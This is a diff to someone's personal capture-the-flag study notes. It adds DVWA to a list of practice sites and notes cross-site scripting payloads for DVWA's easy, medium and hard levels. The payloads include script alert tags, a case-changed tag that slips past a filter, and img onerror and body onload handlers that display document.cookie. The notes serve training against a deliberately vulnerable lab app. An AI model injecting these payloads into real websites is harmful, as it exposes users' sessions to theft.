@@ -7,6 +7,7 @@
 * try hack me =  bank siutation
 * root me = all sites
 * ctflearn = basic problems
+* DVWA (Damn Vunerable Web Application)
 
 
 ## Resources
@@ -60,5 +61,19 @@
 * Reverse polarity
 * Hextrodinary
 
-
+### WVWP
+- Uses BURP suite and XAMPP
+- Cross site scripting (XSS)
+  <br>EASY<br>
+  <script>alert("asd")</script>
+  <script>alert(document.cookie)</script>
+  <br>MEDIUM<br>
+  <Script>alert("asd")</Script>
+  <br>HARD<br>
+  <img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);> = to get access to the cookie
+  <body onload=alert('test1')> = to send an alert in another format
+  <br>IMPOSSIBLE<br>
+- Bruteforce 
+  <br>EASY</br>
+  
 
